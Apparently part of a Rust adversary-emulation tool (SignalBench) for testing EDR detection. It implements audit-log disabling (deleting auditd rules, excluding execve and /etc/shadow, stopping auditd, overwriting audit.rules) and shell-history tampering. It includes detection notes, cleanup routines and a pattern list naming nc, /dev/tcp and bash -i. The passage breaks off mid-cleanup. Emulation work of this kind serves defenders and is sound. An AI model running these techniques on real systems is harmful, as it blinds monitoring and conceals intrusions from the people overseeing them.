use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{ExecuteFuture, CleanupFuture};
use async_trait::async_trait;
use log::{info, warn};
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use uuid::Uuid;

pub struct DisableAuditLogs {}

#[async_trait]
impl AttackTechnique for DisableAuditLogs {
    fn info(&self) -> Technique {
        Technique {
            id: "T1562.002".to_string(),
            name: "Disable Linux Audit Logs".to_string(),
            description: "Audit system manipulation - combines multiple methods to disable Linux audit logging when running as root. Executes auditctl to delete ALL rules and add exclusions for /tmp and /var, optionally stops auditd service completely, and can directly modify /etc/audit/audit.rules. Uses multiple simultaneous manipulation techniques for maximum EDR detection. Requires root privileges.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "backup_file".to_string(),
                    description: "Path to save backup of original audit state".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_audit_backup.json".to_string()),
                },
                TechniqueParameter {
                    name: "disable_service".to_string(),
                    description: "Stop the auditd service completely (default: true when root, generates systemctl telemetry)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "modify_config".to_string(),
                    description: "Directly modify /etc/audit/audit.rules file (default: false, direct file modification)".to_string(),
                    required: false,
                    default: Some("false".to_string()),
                },
            ],
            detection: "Monitor for: (1) auditctl rule deletions and suspicious exclusion rules, (2) systemctl stop/disable commands against auditd, (3) modifications to /etc/audit/audit.rules, (4) sudden loss of audit telemetry, (5) service state changes from active to inactive. EDR systems should detect multiple simultaneous audit manipulation methods.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;
            
            let backup_file = config
                .parameters
                .get("backup_file")
                .unwrap_or(&"/tmp/signalbench_audit_backup.json".to_string())
                .clone();
            
            let disable_service = config
                .parameters
                .get("disable_service")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            let modify_config = config
                .parameters
                .get("modify_config")
                .unwrap_or(&"false".to_string())
                .to_lowercase() == "true";
            
            // Check if running as root
            let is_root = unsafe { libc::geteuid() == 0 };
            
            if dry_run {
                info!("[DRY RUN] Would check auditd status and manipulate audit system");
                info!("[DRY RUN] Running as root: {is_root}");
                info!("[DRY RUN] disable_service: {disable_service}");
                info!("[DRY RUN] modify_config: {modify_config}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would manipulate audit system (root: {is_root}, disable_service: {disable_service}, modify_config: {modify_config})"),
                    artifacts: vec![backup_file],
                    cleanup_required: false,
                });
            }

            let mut manipulation_log = String::new();
            let mut methods_used = Vec::new();
            let mut artifacts = vec![backup_file.clone()];
            
            // Step 1: Check if auditd is running
            manipulation_log.push_str("=== Audit System Status Check ===\n");
            let auditd_running = Command::new("systemctl")
                .args(["is-active", "auditd"])
                .output()
                .await
                .map(|output| output.status.success())
                .unwrap_or(false);
            
            manipulation_log.push_str(&format!("Auditd service running: {auditd_running}\n"));
            manipulation_log.push_str(&format!("Running as root: {is_root}\n"));
            
            // Check for auditctl
            let auditctl_exists = Path::new("/sbin/auditctl").exists() || 
                                  Path::new("/usr/sbin/auditctl").exists();
            manipulation_log.push_str(&format!("auditctl available: {auditctl_exists}\n\n"));
            
            // Step 2: Backup current audit state
            manipulation_log.push_str("=== Backing Up Original Audit State ===\n");
            
            let mut backup_data = String::new();
            backup_data.push_str("{\n");
            backup_data.push_str(&format!("  \"timestamp\": \"{}\",\n", chrono::Local::now().to_rfc3339()));
            backup_data.push_str(&format!("  \"auditd_running\": {auditd_running},\n"));
            backup_data.push_str(&format!("  \"is_root\": {is_root},\n"));
            backup_data.push_str("  \"service_was_stopped\": false,\n");
            
            // Backup current audit rules
            if auditctl_exists && is_root {
                match Command::new("auditctl").arg("-l").output().await {
                    Ok(output) => {
                        let rules = String::from_utf8_lossy(&output.stdout);
                        backup_data.push_str(&format!("  \"original_rules\": {},\n", 
                            serde_json::to_string(&rules.to_string()).unwrap_or_else(|_| "\"\"".to_string())));
                        manipulation_log.push_str(&format!("Backed up {} audit rules\n", 
                            rules.lines().count()));
                    }
                    Err(e) => {
                        manipulation_log.push_str(&format!("Failed to backup rules: {e}\n"));
                        backup_data.push_str("  \"original_rules\": \"\",\n");
                    }
                }
            } else {
                backup_data.push_str("  \"original_rules\": \"\",\n");
            }
            
            // Backup audit configuration file if it exists
            let audit_conf_path = "/etc/audit/audit.rules";
            if Path::new(audit_conf_path).exists() && is_root {
                match fs::read_to_string(audit_conf_path) {
                    Ok(content) => {
                        backup_data.push_str(&format!("  \"audit_rules_file_content\": {},\n",
                            serde_json::to_string(&content).unwrap_or_else(|_| "\"\"".to_string())));
                        manipulation_log.push_str(&format!("Backed up {audit_conf_path}\n"));
                    }
                    Err(e) => {
                        manipulation_log.push_str(&format!("Could not read {audit_conf_path}: {e}\n"));
                        backup_data.push_str("  \"audit_rules_file_content\": \"\",\n");
                    }
                }
            } else {
                backup_data.push_str("  \"audit_rules_file_content\": \"\",\n");
            }
            
            manipulation_log.push('\n');
            
            // Step 3: Audit System Manipulation (only if root)
            let mut service_was_stopped = false;
            
            if is_root {
                manipulation_log.push_str("=== Audit Manipulation (ROOT) ===\n");
                manipulation_log.push_str(&format!("Configuration: disable_service={disable_service}, modify_config={modify_config}\n\n"));
                
                // Method 1: Use auditctl to delete ALL rules and add exclusions
                if auditctl_exists {
                    manipulation_log.push_str("METHOD 1: Enhanced auditctl manipulation\n");
                    manipulation_log.push_str("Executing: auditctl -D (delete ALL rules)...\n");
                    
                    match Command::new("auditctl").arg("-D").output().await {
                        Ok(output) => {
                            if output.status.success() {
                                methods_used.push("auditctl_delete_rules".to_string());
                                manipulation_log.push_str("✓ Successfully deleted all audit rules with auditctl -D\n");
                                
                                // Add exclusion rules for directories and files
                                manipulation_log.push_str("\nAdding exclusion rules...\n");
                                
                                // Rule 1: Exclude /tmp directory (common staging location)
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-F", "dir=/tmp"])
                                    .output()
                                    .await {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str("  ✓ Added exclusion for /tmp directory\n");
                                        } else {
                                            manipulation_log.push_str("  ✗ Failed to add /tmp exclusion\n");
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!("  ✗ Error adding /tmp rule: {e}\n"));
                                    }
                                }
                                
                                // Rule 2: Exclude /var directory
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-F", "dir=/var"])
                                    .output()
                                    .await {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str("  ✓ Added exclusion for /var directory\n");
                                        } else {
                                            manipulation_log.push_str("  ✗ Failed to add /var exclusion\n");
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!("  ✗ Error adding /var rule: {e}\n"));
                                    }
                                }
                                
                                // Rule 3: Exclude /etc/passwd writes
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-F", "path=/etc/passwd", "-F", "perm=wa"])
                                    .output()
                                    .await {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str("  ✓ Added exclusion for /etc/passwd writes\n");
                                        } else {
                                            manipulation_log.push_str("  ✗ Failed to add /etc/passwd exclusion\n");
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!("  ✗ Error adding /etc/passwd rule: {e}\n"));
                                    }
                                }
                                
                                // Rule 4: Exclude /etc/shadow writes
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-F", "path=/etc/shadow", "-F", "perm=wa"])
                                    .output()
                                    .await {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str("  ✓ Added exclusion for /etc/shadow writes\n");
                                        } else {
                                            manipulation_log.push_str("  ✗ Failed to add /etc/shadow exclusion\n");
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!("  ✗ Error adding /etc/shadow rule: {e}\n"));
                                    }
                                }
                                
                                // Rule 5: Exclude execve syscalls (process execution)
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-S", "execve"])
                                    .output()
                                    .await {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str("  ✓ Added exclusion for execve syscalls\n");
                                        } else {
                                            manipulation_log.push_str("  ✗ Failed to add execve exclusion\n");
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!("  ✗ Error adding execve rule: {e}\n"));
                                    }
                                }
                                
                                // Rule 6: Exclude execveat syscalls
                                match Command::new("auditctl")
                                    .args(["-a", "never,exit", "-S", "execveat"])
                                    .output()
                                    .await {
                                    Ok(cmd_output) => {
                                        if cmd_output.status.success() {
                                            manipulation_log.push_str("  ✓ Added exclusion for execveat syscalls\n");
                                        } else {
                                            manipulation_log.push_str("  ✗ Failed to add execveat exclusion\n");
                                        }
                                    }
                                    Err(e) => {
                                        manipulation_log.push_str(&format!("  ✗ Error adding execveat rule: {e}\n"));
                                    }
                                }
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                manipulation_log.push_str(&format!("✗ Failed to delete rules: {stderr}\n"));
                            }
                        }
                        Err(e) => {
                            manipulation_log.push_str(&format!("✗ Error executing auditctl: {e}\n"));
                        }
                    }
                }
                
                // Method 2: Stop auditd service (if enabled)
                if disable_service && auditd_running {
                    manipulation_log.push_str("\nMETHOD 2: Stopping auditd service\n");
                    manipulation_log.push_str("Executing: systemctl stop auditd...\n");
                    
                    match Command::new("systemctl").args(["stop", "auditd"]).output().await {
                        Ok(output) => {
                            if output.status.success() {
                                methods_used.push("service_stop".to_string());
                                service_was_stopped = true;
                                manipulation_log.push_str("✓ Successfully stopped auditd service\n");
                                manipulation_log.push_str("  WARNING: Service state change generates EDR telemetry!\n");
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                manipulation_log.push_str(&format!("✗ Failed to stop service: {stderr}\n"));
                            }
                        }
                        Err(e) => {
                            manipulation_log.push_str(&format!("✗ Error stopping service: {e}\n"));
                        }
                    }
                }
                
                // Method 3: Modify audit.rules file (if enabled - direct file modification)
                if modify_config && Path::new(audit_conf_path).exists() {
                    manipulation_log.push_str("\nMETHOD 3: Direct modification of /etc/audit/audit.rules\n");
                    manipulation_log.push_str(&format!("Modifying {audit_conf_path}...\n"));
                    
                    let disable_rules = r#"
## SignalBench T1562.002 - Audit Rules Disabled by GoCortex.io v1.5.13
## Original rules backed up to backup file
## WARNING: This generates file modification telemetry

# Delete all previous rules
-D

# Exclude /tmp directory (common staging location)
-a never,exit -F dir=/tmp

# Exclude /var directory
-a never,exit -F dir=/var

# Disable syscall auditing for process execution
-a never,exit -S execve
-a never,exit -S execveat

# Disable file auditing for sensitive locations
-a never,exit -F path=/etc/passwd -F perm=wa
-a never,exit -F path=/etc/shadow -F perm=wa
-a never,exit -F path=/etc/sudoers -F perm=wa
-a never,exit -F path=/etc/group -F perm=wa

# Disable command execution auditing (both architectures)
-a never,exit -F arch=b64 -S execve,execveat
-a never,exit -F arch=b32 -S execve,execveat

# Disable file operations auditing
-a never,exit -S open,openat,creat
-a never,exit -S unlink,unlinkat,rename,renameat
"#;
                    
                    match File::create(audit_conf_path) {
                        Ok(mut file) => {
                            match file.write_all(disable_rules.as_bytes()) {
                                Ok(_) => {
                                    methods_used.push("file_modification".to_string());
                                    manipulation_log.push_str(&format!("✓ Successfully modified {audit_conf_path}\n"));
                                    manipulation_log.push_str("  WARNING: File modification generates strong EDR signals!\n");
                                }
                                Err(e) => {
                                    manipulation_log.push_str(&format!("✗ Failed to write to file: {e}\n"));
                                }
                            }
                        }
                        Err(e) => {
                            manipulation_log.push_str(&format!("✗ Failed to open file: {e}\n"));
                        }
                    }
                }
                
            } else {
                manipulation_log.push_str("=== NOT RUNNING AS ROOT ===\n");
                manipulation_log.push_str("Audit manipulation requires root privileges.\n");
                manipulation_log.push_str("Only creating simulation telemetry.\n\n");
                
                methods_used.push("simulation_only".to_string());
                
                let sim_file = "/tmp/signalbench_audit_simulation.log".to_string();
                artifacts.push(sim_file.clone());
                
                let mut sim_log = File::create(&sim_file)
                    .map_err(|e| format!("Failed to create simulation log: {e}"))?;
                writeln!(sim_log, "=== SignalBench Audit Manipulation Simulation ===")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(sim_log, "NOT running as root - simulation only")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(sim_log, "\nTo perform real manipulation, run as root:")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(sim_log, "  sudo signalbench --technique T1562.002")
                    .map_err(|e| format!("Failed to write: {e}"))?;
            }
            
            // Complete backup file with comprehensive tracking
            let methods_json = serde_json::to_string(&methods_used).unwrap_or_else(|_| "[]".to_string());
            backup_data = backup_data.replace("\"service_was_stopped\": false,", 
                                              &format!("\"service_was_stopped\": {service_was_stopped},"));
            backup_data.push_str(&format!("  \"methods_used\": {methods_json},\n"));
            backup_data.push_str(&format!("  \"backed_up_files\": [\"{backup_file}\"],\n"));
            backup_data.push_str(&format!("  \"disable_service_param\": {disable_service},\n"));
            backup_data.push_str(&format!("  \"modify_config_param\": {modify_config}\n"));
            backup_data.push_str("}\n");
            
            let mut backup = File::create(&backup_file)
                .map_err(|e| format!("Failed to create backup file: {e}"))?;
            backup.write_all(backup_data.as_bytes())
                .map_err(|e| format!("Failed to write backup: {e}"))?;
            
            manipulation_log.push_str("\n=== Audit Manipulation Summary ===\n");
            manipulation_log.push_str(&format!("Methods used: {}\n", methods_used.join(", ")));
            manipulation_log.push_str(&format!("Service was stopped: {service_was_stopped}\n"));
            manipulation_log.push_str(&format!("Backup file: {backup_file}\n"));
            
            info!("{manipulation_log}");
            
            let success_msg = if is_root {
                if methods_used.is_empty() {
                    format!("WARNING: No manipulation methods succeeded. Check logs. Backup saved to {backup_file}")
                } else {
                    format!("Audit manipulation completed using {} method(s): {}. Service stopped: {}. Backup: {backup_file}", 
                            methods_used.len(), methods_used.join(", "), service_was_stopped)
                }
            } else {
                format!("Simulation only (not root). Created telemetry without actual manipulation. Backup: {backup_file}")
            };
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: success_msg,
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;
            
            info!("=== Restoring Audit System ===");
            
            // Find the backup file
            let backup_file = artifacts.iter()
                .find(|f| f.contains("backup.json"))
                .cloned();
            
            if let Some(backup_path) = backup_file {
                if Path::new(&backup_path).exists() {
                    // Read backup to determine restoration method
                    match fs::read_to_string(&backup_path) {
                        Ok(backup_content) => {
                            info!("Reading backup from: {backup_path}");
                            
                            // Parse the backup JSON
                            if let Ok(backup_json) = serde_json::from_str::<serde_json::Value>(&backup_content) {
                                let methods_used = backup_json.get("methods_used")
                                    .and_then(|v| v.as_array())
                                    .map(|arr| arr.iter()
                                        .filter_map(|v| v.as_str())
                                        .map(|s| s.to_string())
                                        .collect::<Vec<_>>())
                                    .unwrap_or_default();
                                
                                let service_was_stopped = backup_json.get("service_was_stopped")
                                    .and_then(|v| v.as_bool())
                                    .unwrap_or(false);
                                
                                let is_root = unsafe { libc::geteuid() == 0 };
                                
                                info!("Detected methods used: {}", methods_used.join(", "));
                                info!("Service was stopped: {service_was_stopped}");
                                
                                if !is_root {
                                    warn!("Not running as root - cannot restore audit system");
                                    warn!("Run cleanup with sudo to properly restore audit configuration");
                                } else {
                                    // Restore in reverse order for safety
                                    
                                    // Step 1: Restore file modification if it was done
                                    if methods_used.contains(&"file_modification".to_string()) {
                                        info!("\n=== Restoring /etc/audit/audit.rules ===");
                                        
                                        if let Some(original_content) = backup_json.get("audit_rules_file_content")
                                            .and_then(|v| v.as_str()) {
                                            
                                            match File::create("/etc/audit/audit.rules") {
                                                Ok(mut file) => {
                                                    match file.write_all(original_content.as_bytes()) {
                                                        Ok(_) => {
                                                            info!("✓ Successfully restored audit.rules file");
                                                        }
                                                        Err(e) => warn!("✗ Failed to write restored rules: {e}"),
                                                    }
                                                }
                                                Err(e) => warn!("✗ Failed to open audit.rules: {e}"),
                                            }
                                        }
                                    }
                                    
                                    // Step 2: Restore audit rules if they were deleted
                                    if methods_used.contains(&"auditctl_delete_rules".to_string()) {
                                        info!("\n=== Restoring Audit Rules ===");
                                        
                                        // First, delete all current malicious rules
                                        info!("Clearing current (malicious) audit rules...");
                                        let _ = Command::new("auditctl").arg("-D").output().await;
                                        
                                        // Restore original rules
                                        if let Some(rules_str) = backup_json.get("original_rules")
                                            .and_then(|v| v.as_str()) {
                                            
                                            let rules: Vec<&str> = rules_str.lines()
                                                .filter(|line| !line.trim().is_empty() && !line.starts_with("No rules"))
                                                .collect();
                                            
                                            if !rules.is_empty() {
                                                info!("Restoring {} audit rules...", rules.len());
                                                
                                                // Write rules to temporary file
                                                let temp_rules = "/tmp/signalbench_restore_rules.txt";
                                                if let Ok(mut f) = File::create(temp_rules) {
                                                    for rule in &rules {
                                                        let _ = writeln!(f,"{rule}");
                                                    }
                                                    
                                                    // Load rules from file
                                                    match Command::new("auditctl")
                                                        .args(["-R", temp_rules])
                                                        .output()
                                                        .await {
                                                        Ok(output) => {
                                                            if output.status.success() {
                                                                info!("✓ Successfully restored audit rules");
                                                            } else {
                                                                warn!("✗ Failed to restore some audit rules");
                                                            }
                                                        }
                                                        Err(e) => warn!("✗ Error restoring rules: {e}"),
                                                    }
                                                    
                                                    let _ = fs::remove_file(temp_rules);
                                                }
                                            } else {
                                                info!("No rules to restore (system had no rules)");
                                            }
                                        }
                                    }
                                    
                                    // Step 3: Restart auditd service if it was stopped
                                    if service_was_stopped {
                                        info!("\n=== Restarting Auditd Service ===");
                                        info!("Service was stopped during manipulation - restarting...");
                                        
                                        match Command::new("systemctl")
                                            .args(["start", "auditd"])
                                            .output()
                                            .await {
                                            Ok(output) => {
                                                if output.status.success() {
                                                    info!("✓ Successfully restarted auditd service");
                                                } else {
                                                    let stderr = String::from_utf8_lossy(&output.stderr);
                                                    warn!("✗ Failed to restart auditd service: {stderr}");
                                                }
                                            }
                                            Err(e) => warn!("✗ Error restarting service: {e}"),
                                        }
                                    }
                                    
                                    // Handle simulation-only case
                                    if methods_used.contains(&"simulation_only".to_string()) {
                                        info!("Simulation only - no restoration needed");
                                    }
                                    
                                    // Verify audit system is restored
                                    info!("\n=== Verifying Audit System ===");
                                    match Command::new("systemctl")
                                        .args(["is-active", "auditd"])
                                        .output()
                                        .await {
                                        Ok(output) => {
                                            if output.status.success() {
                                                info!("✓ Auditd service is active");
                                            } else {
                                                warn!("✗ Auditd service is not active");
                                            }
                                        }
                                        Err(e) => warn!("Could not check auditd status: {e}"),
                                    }
                                    
                                    if Path::new("/sbin/auditctl").exists() || Path::new("/usr/sbin/auditctl").exists() {
                                        if let Ok(output) = Command::new("auditctl").arg("-l").output().await {
                                            let rules_count = String::from_utf8_lossy(&output.stdout)
                                                .lines()
                                                .filter(|line| !line.starts_with("No rules"))
                                                .count();
                                            info!("Current audit rules: {rules_count}");
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            warn!("Failed to read backup file: {e}");
                        }
                    }
                }
            }
            
            // Clean up artifacts
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            
            info!("=== Audit System Restoration Complete ===");
            Ok(())
        })
    }
}

pub struct ClearBashHistory {}

#[async_trait]
impl AttackTechnique for ClearBashHistory {
    fn info(&self) -> Technique {
        Technique {
            id: "T1070.003".to_string(),
            name: "Clear Command History".to_string(),
            description: "REAL shell history manipulation - backs up and modifies multiple shell history files (.bash_history, .zsh_history, .python_history, etc.) by either truncating them or removing suspicious command patterns. Generates file modification telemetry detectable by EDR systems monitoring history tampering.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "clear_method".to_string(),
                    description: "Method to clear history: 'truncate' (clear all) or 'filter' (remove suspicious patterns)".to_string(),
                    required: false,
                    default: Some("filter".to_string()),
                },
            ],
            detection: "Monitor for history file modifications, truncation events, inode changes, and unusual access patterns to shell history files. EDR systems typically alert on history file tampering.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use std::os::unix::fs::PermissionsExt;
            use uuid::Uuid;
            
            let session_id = Uuid::new_v4().to_string()[..8].to_string();
            let backup_dir = format!("/tmp/signalbench_history_backup_{session_id}");
            let clear_log = format!("/tmp/signalbench_history_clear_{session_id}.log");
            let artifacts_json = format!("/tmp/signalbench_history_artifacts_{session_id}.json");
            
            let clear_method = config
                .parameters
                .get("clear_method")
                .unwrap_or(&"filter".to_string())
                .clone();
            
            let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
            
            // History files to target
            let history_files = vec![
                format!("{home}/.bash_history"),
                format!("{home}/.zsh_history"),
                format!("{home}/.python_history"),
                format!("{home}/.lesshst"),
                format!("{home}/.mysql_history"),
                format!("{home}/.psql_history"),
            ];
            
            if dry_run {
                info!("[DRY RUN] Would modify shell history files using method: {clear_method}");
                info!("[DRY RUN] Target files: {}", history_files.join(", "));
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would clear history files using method {clear_method}"),
                    artifacts: vec![backup_dir, clear_log, artifacts_json],
                    cleanup_required: false,
                });
            }

            // Create backup directory
            fs::create_dir_all(&backup_dir)
                .map_err(|e| format!("Failed to create backup directory: {e}"))?;
            info!("Created backup directory: {backup_dir}");

            let mut log_file = File::create(&clear_log)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            
            writeln!(log_file, "=== SignalBench T1070.003 Clear Command History ===")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Session ID: {session_id}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Clear method: {clear_method}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Backup directory: {backup_dir}\n")
                .map_err(|e| format!("Failed to write: {e}"))?;

            // Suspicious patterns to filter
            let suspicious_patterns = [
                "ssh", "sudo", "wget", "curl", "nc", "bash -i", 
                "/dev/tcp", "base64", "python -c", "perl -e",
            ];

            let mut artifacts_data = serde_json::json!({
                "session_id": session_id,
                "timestamp": chrono::Local::now().to_rfc3339(),
                "clear_method": clear_method,
                "backup_directory": backup_dir,
                "files_modified": [],
            });

            let mut total_files_modified = 0;
            let mut total_entries_removed = 0;

            writeln!(log_file, "=== Processing History Files ===\n")
                .map_err(|e| format!("Failed to write: {e}"))?;

            for history_path in &history_files {
                if !Path::new(history_path).exists() {
                    writeln!(log_file, "⊘ Skipping {history_path} (does not exist)")
                        .map_err(|e| format!("Failed to write: {e}"))?;
                    continue;
                }

                let file_name = Path::new(history_path)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("unknown");
                
                writeln!(log_file, "Processing: {history_path}")
                    .map_err(|e| format!("Failed to write: {e}"))?;

                // Read original content
                let original_content = fs::read_to_string(history_path)
                    .map_err(|e| format!("Failed to read {history_path}: {e}"))?;
                let original_lines: Vec<&str> = original_content.lines().collect();
                let original_count = original_lines.len();

                // Get original permissions
                let metadata = fs::metadata(history_path)
                    .map_err(|e| format!("Failed to get metadata: {e}"))?;
                let original_perms = metadata.permissions().mode();

                // Backup the file
                let backup_path = format!("{backup_dir}/{file_name}");
                fs::copy(history_path, &backup_path)
                    .map_err(|e| format!("Failed to backup {history_path}: {e}"))?;
                
                writeln!(log_file, "  ✓ Backed up to: {backup_path}")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(log_file, "  Original entries: {original_count}")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(log_file, "  Original permissions: {original_perms:o}")
                    .map_err(|e| format!("Failed to write: {e}"))?;

                // Modify the history file
                let (modified_content, entries_removed, removed_samples) = if clear_method == "truncate" {
                    // Truncate to empty
                    writeln!(log_file, "  Method: Truncating to 0 bytes")
                        .map_err(|e| format!("Failed to write: {e}"))?;
                    (String::new(), original_count, original_lines.iter().take(10).map(|s| s.to_string()).collect::<Vec<_>>())
                } else {
                    // Filter suspicious patterns
                    writeln!(log_file, "  Method: Filtering suspicious patterns")
                        .map_err(|e| format!("Failed to write: {e}"))?;
                    
                    let mut removed = Vec::new();
                    let filtered_lines: Vec<&str> = original_lines.iter()
                        .filter(|line| {
                            let is_suspicious = suspicious_patterns.iter()
                                .any(|pattern| line.contains(pattern));
                            
                            if is_suspicious && removed.len() < 10 {
                                removed.push(line.to_string());
                            }
                            
                            !is_suspicious
                        })
                        .copied()
                        .collect();
                    
                    let new_content = filtered_lines.join("\n");
                    let removed_count = original_count - filtered_lines.len();
                    
                    (new_content, removed_count, removed)
                };

                // Write modified content back
                fs::write(history_path, &modified_content)
                    .map_err(|e| format!("Failed to write modified content: {e}"))?;
                
                // Restore original permissions
                fs::set_permissions(history_path, fs::Permissions::from_mode(original_perms))
                    .map_err(|e| format!("Failed to set permissions: {e}"))?;

                writeln!(log_file, "  ✓ Modified history file")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                writeln!(log_file, "  Entries removed: {entries_removed}")
                    .map_err(|e| format!("Failed to write: {e}"))?;
                
                if !removed_samples.is_empty() {
                    writeln!(log_file, "  Sample of removed entries (first 10):")
                        .map_err(|e| format!("Failed to write: {e}"))?;
                    for (idx, entry) in removed_samples.iter().enumerate() {
                        writeln!(log_file, "    [{idx}] {entry}")
                            .map_err(|e| format!("Failed to write: {e}"))?;
                    }
                }
                
                writeln!(log_file)
                    .map_err(|e| format!("Failed to write: {e}"))?;

                // Track in artifacts
                if let Some(files) = artifacts_data["files_modified"].as_array_mut() {
                    files.push(serde_json::json!({
                        "path": history_path,
                        "backup_path": backup_path,
                        "original_count": original_count,
                        "entries_removed": entries_removed,
                        "permissions": format!("{:o}", original_perms),
                    }));
                }

                total_files_modified += 1;
                total_entries_removed += entries_removed;
            }

            writeln!(log_file, "\n=== Summary ===")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Files modified: {total_files_modified}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Total entries removed: {total_entries_removed}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Clear method used: {clear_method}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "\nAll original files backed up to: {backup_dir}")
                .map_err(|e| format!("Failed to write: {e}"))?;
            writeln!(log_file, "Cleanup will restore all files from backup.")
                .map_err(|e| format!("Failed to write: {e}"))?;

            // Save artifacts JSON
            let mut artifacts_file = File::create(&artifacts_json)
                .map_err(|e| format!("Failed to create artifacts file: {e}"))?;
            artifacts_file.write_all(serde_json::to_string_pretty(&artifacts_data)
                .map_err(|e| format!("Failed to serialise artifacts: {e}"))?
                .as_bytes())
                .map_err(|e| format!("Failed to write artifacts: {e}"))?;

            info!("Modified {total_files_modified} history files, removed {total_entries_removed} entries");
            info!("Comprehensive log: {clear_log}");
            info!("Backups stored in: {backup_dir}");

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully modified {total_files_modified} history files using method '{clear_method}'. Removed {total_entries_removed} entries. Backups in {backup_dir}"),
                artifacts: vec![backup_dir, clear_log, artifacts_json],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            use std::os::unix::fs::PermissionsExt;
            
            info!("=== Restoring Shell History Files ===");

            // Find the backup directory and artifacts JSON
            let _backup_dir = artifacts.iter()
                .find(|a| a.contains("history_backup_"))
                .cloned();
            
            let artifacts_json = artifacts.iter()
                .find(|a| a.contains("artifacts_") && a.ends_with(".json"))
                .cloned();

            if let Some(artifacts_path) = artifacts_json {
                if Path::new(&artifacts_path).exists() {
                    // Read artifacts to get restoration information
                    match fs::read_to_string(&artifacts_path) {
                        Ok(content) => {
                            if let Ok(artifacts_data) = serde_json::from_str::<serde_json::Value>(&content) {
                                if let Some(files) = artifacts_data["files_modified"].as_array() {
                                    info!("Restoring {} history files from backup...", files.len());
                                    
                                    let mut restored_count = 0;
                                    let mut failed_count = 0;

                                    for file_info in files {
                                        let original_path = file_info["path"].as_str().unwrap_or("");
                                        let backup_path = file_info["backup_path"].as_str().unwrap_or("");
                                        let perms_str = file_info["permissions"].as_str().unwrap_or("600");
                                        
                                        if original_path.is_empty() || backup_path.is_empty() {
                                            continue;
                                        }

                                        if !Path::new(backup_path).exists() {
                                            warn!("Backup file not found: {backup_path}");
                                            failed_count += 1;
                                            continue;
                                        }

                                        // Restore the file
                                        match fs::copy(backup_path, original_path) {
                                            Ok(_) => {
                                                info!("  ✓ Restored: {original_path}");
                                                
                                                // Restore original permissions
                                                if let Ok(perms_mode) = u32::from_str_radix(perms_str, 8) {
                                                    let _ = fs::set_permissions(
                                                        original_path,
